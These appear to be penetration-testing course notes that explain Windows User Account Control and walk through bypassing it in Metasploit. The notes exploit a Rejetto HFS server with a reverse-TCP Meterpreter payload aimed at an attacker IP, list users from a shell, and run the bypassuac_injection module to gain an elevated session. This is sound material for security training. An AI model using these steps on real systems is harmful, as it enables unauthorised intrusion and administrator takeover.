## UAC
* USer Account Control --> Windows security feature introduced in Vista
* USed to prevent unauthorized changes from being made to the OS.
* It ensures that changes to the OS requires approval from the administrator.
* **How to exploit**
  * Utilize the "Windows Escalate UAC Protection Bypass (In-memory injection) module.
  * This module utilizes the trusted publisher certificate through process injection.
  * RESULT: It will spawn a second shell that has the UAC flag turned off.
 
* PRACTICAL
* Repeat steps till db_nmap
* `use exploit/windows/http/rejetto_hfs_exec`
* To bypass UAC, we have to set payload to the x64 (64-bit) architecture
* `set payload windows/x64/meterpreter/reverse_tcp`
* `set lhost [attacker's IP]`
* `run`
* ***
* NOTE: "admin" has lower privileges than that of "administrator"
* ***
* How to list the users added in Administrator's group
* Inside the meterpreter session --> `shell`
* `net users`
* If your meterpreter user is part of this group, then only it's possible to turn UAC off in the followinf steps.
* ***
* How to bypass UAC
* `use exploit/windows/local/bypassuac_injection`
* `set session [ID]`
* `set lport [some other port than what is used by meterpreter session already running]`
* `set target Windows\ x64`
* `set payload windows/x64/meterpreter/reverese_tcp`
* `run`
* Now as we have bypassed UAC, we can run the commands that require Administrator privileges.
